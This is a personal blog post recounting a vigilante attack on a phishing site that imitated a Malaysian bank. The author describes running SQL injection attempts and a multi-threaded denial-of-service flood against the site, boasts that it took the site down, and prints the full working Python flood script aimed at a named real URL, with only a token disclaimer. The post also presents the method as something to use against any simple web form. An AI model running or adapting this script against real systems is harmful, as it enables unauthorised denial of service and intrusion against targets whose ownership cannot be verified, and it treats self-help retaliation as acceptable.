---
layout: default
title:  "Annoying those phishers"
date:   2021-01-21 12:56:00 +0800
---

So a few hours ago a friend alerted me on facebook about a phishing site hosted in Turkey. After doing reconnaissance, i found out that the website is hosted in Turkey and the perpretor is actually a portuguese.

![Phishing site]({{ site.url }}/assets/images/maybank phishing.jpg){:class="img-responsive"}

And this guy was collecting username and passwords of a large bank in Malaysia (I am in Malaysia).

Ran a couple of SQL Injection scripts but at the same time i wrote a DoS script that is powerful that was utilizing the perpretor's resources and might send an alert to the provider on the activity on their network.

After working on the third version of the python script which was heavily threaded, i had also made a similar version that sends a large data that will be stored in his database. (the limit of a table size in MySQL is 65536 bytes) but i was hitting his server at 50Mbit/s running 25 python threads at one short.

so 2 scripts, my machine was running 50 threads concurrently.

![Python DoS]({{ site.url }}/assets/images/python dos.png){:class="img-responsive"}

For the two scripts, one with small payloads (to increase autoincrement faster) and a bigger payload (about 1.5MB per database row)

The reason why i chose to attack using two different payloads is to use up the adversary's resources a lot faster (table size limit or table id limit, or the database connection has been used up)

After running it for about half-and-hour, the perpretor finally took it's website down.

![Site 404]({{ site.url }}/assets/images/attack successful.png){:class="img-responsive"}

Most of the phishing sites are really simple forms and you can check the requests to launch and attack on them.

The only purpose of such phishing sites are just to collect data and we can use that as the weakness to overload their systems, whether their web code (number of connections that it can use to connect to database) or the database itself (max table size, incremental ids)

So here is the script (do not abuse it but you can read it for educational purposes)

fills the database with large random data at 500kb per column
```
import logging
import threading
import requests
import random, string

def randomword(length):
   letters = string.ascii_lowercase
   return ''.join(random.choice(letters) for i in range(length))

headers = {'User-Agent': 'Mozilla/5.0'}
payload = {'pais':'ru','ip':'0.0.0.0', 'password': randomword(500000), 'systema': randomword(500000), 'ir': randomword(500000)}

def generate_requests(name):
    while True:
        logging.info("Thread %s: starting", name)
        session = requests.Session()
        r = session.post('https://onlinemaycampaign.com/home/m2u/common/indexSend.php',headers=headers,data=payload)
        print(r.text)
        logging.info("Thread %s: finishing", name)

if __name__ == "__main__":
    format = "%(asctime)s: %(message)s"
    logging.basicConfig(format=format, level=logging.INFO,
                        datefmt="%H:%M:%S")

    threads = list()
    for index in range(25):
        logging.info("Main    : create and start thread %d.", index)
        x = threading.Thread(target=generate_requests, args=(index,))
        threads.append(x)
        x.start()

    for index, thread in enumerate(threads):
        logging.info("Main    : before joining thread %d.", index)
        thread.join()
        logging.info("Main    : thread %d done", index)
```
